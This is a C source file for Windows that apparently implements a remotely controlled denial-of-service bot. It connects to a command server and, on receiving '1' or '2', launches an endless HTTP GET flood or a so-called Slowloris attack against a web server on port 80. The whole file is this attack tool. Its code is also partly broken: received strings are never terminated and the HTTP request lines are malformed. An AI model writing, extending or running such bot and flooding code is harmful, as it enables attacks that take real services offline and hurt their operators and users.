#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <Windows.h>
#include <stdlib.h>
#include <winsock2.h>
#include <stdio.h>

#pragma comment (lib, "ws2_32.lib")


#define BUFLEN 1024
#define DEFAULT_PORT "1234"
#define BUFF_SIZE 1024
#define IPADDR "127.0.0.1"
#define PORT 80


int sock0;
int main()
{
    WSADATA wsa;
    SOCKET ConnectSocket = INVALID_SOCKET;
    
    sock0 = WSAStartup(MAKEWORD(2, 2), &wsa);
    if (sock0 != 0) {
        printf("CONNECT error: %d\n", sock0);
        return 1;
    }
    printf("CONNECT\n");
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(atoi(DEFAULT_PORT));

    int recvbuflen = BUFLEN;

    
    sock0 = WSAStartup(MAKEWORD(2, 2), &wsa);
    if (sock0 != 0) {
        printf("WSAStartup failed with error: %d\n", sock0);
        return 1;
    }
   
    ConnectSocket = socket(PF_INET, SOCK_STREAM, 0);
    if (ConnectSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    printf("CONNECT\n");

    sock0 = connect(ConnectSocket, (SOCKADDR*)&addr, sizeof(addr));
    printf("CONNECT");
    if (sock0 == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
    }


    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    char recvbuf[BUFLEN];
    int buflen = BUFLEN;
  

    while (1) {
        recv(ConnectSocket, recvbuf, buflen, 0);
        if (strcmp(recvbuf, "ping") == 0) {
            send(ConnectSocket,"pong", (int)strlen("pong"), 0);
            break;
        }

        else if (strcmp(recvbuf, "1") == 0) {
            char command[BUFF_SIZE];
            int len;
            char szBuf[2048];

            SOCKET sock = socket(PF_INET, SOCK_STREAM, 0);

            if (sock == INVALID_SOCKET) {
                perror("Sock Error ");
                system("pause");
                return -1;
            }

            addr.sin_family = AF_INET; 
            addr.sin_port = htons(PORT);
            addr.sin_addr.s_addr = inet_addr(IPADDR);

     
            if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
                printf("Not Connect \n");
                system("pause");
                return 1; 
            }

            memset(szBuf, 0, sizeof(szBuf));
            snprintf(szBuf, sizeof(szBuf),
                "GET / 127.0.0.1:80 http/1.1\r\n"
                "HOST: 127.0.0.1:80 \r\n"
                "Cache-Control: noCache\r\n"
                "\r\n"
            );


            int sock1;

            while (1) {
                sock1 = send(sock, szBuf, sizeof(szBuf), 0);
                send(sock, szBuf, sizeof(szBuf), 0);

                if (sock1 == SOCKET_ERROR) {
                    printf("send failed with error: %d\n", WSAGetLastError());
                    memset(szBuf, 0, sizeof(szBuf));
                    break;
                }

                printf("get flooding success\n\n");
            }
        }
        else if (strcmp(recvbuf, "2") == 0) {
           
                char command[BUFF_SIZE];
                int len;

                SOCKET sock = socket(PF_INET, SOCK_STREAM, 0);
                SOCKADDR_IN addr;

                if (sock == INVALID_SOCKET) {
                    perror("Sock Error ");
                    system("pause");
                    return -1;
                }

                addr.sin_family = AF_INET;
                addr.sin_port = htons(PORT);
                addr.sin_addr.s_addr = inet_addr(IPADDR);


                if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
                    printf("Not Connect \n");
                    system("pause");
                    return 1;
                }

                char msg[1024] = "GET /?127.0.0.1 HTTP/1.1\r\n";

                struct hostent* host;
                host = gethostbyname("127.0.0.1");
                addr.sin_family = AF_INET;
                addr.sin_port = htons(80);
                addr.sin_addr.s_addr = inet_addr(inet_ntoa(*(struct in_addr*) * host->h_addr_list));

                while (1) {
                    send(sock, msg, strlen(msg), 0);
                    printf("sloworis attack success\n\n");
                }
            }
        }
 
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}
